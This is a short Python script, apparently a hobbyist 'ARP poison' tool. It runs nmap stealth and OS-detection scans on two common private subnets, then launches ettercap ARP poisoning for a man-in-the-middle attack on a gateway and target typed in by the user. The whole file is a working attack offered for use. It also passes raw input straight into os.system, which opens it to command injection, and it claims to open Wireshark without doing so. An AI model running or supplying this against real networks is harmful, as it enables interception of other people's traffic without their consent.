#!/usr/bin/env python3

#Welcome to ARPer posion script
import os
from colorama import Fore
print()
print(Fore.GREEN + "We have opened up 'Wireshark' for you, \nwhile you wait for the network scan to finish!\nIf you know gateway and target: press 'ctrl + C' 2x.")
print()
print(Fore.BLUE)
scan1 = os.system("sudo nmap -sN -O 192.168.0.1/24")
scan2 = os.system("sudo nmap -sN -O 10.0.0.1/24")
print(scan1, scan2)
print()
print(Fore.GREEN + "Scan is complete! Choose your MITM target below!")
print()
print(Fore.RED)
attack1 = os.system("sudo ettercap -T -S -i wlan0 -M arp:remote /" + (input("Add gateway: ") + "//" + (input("Add target: ") + "//")))
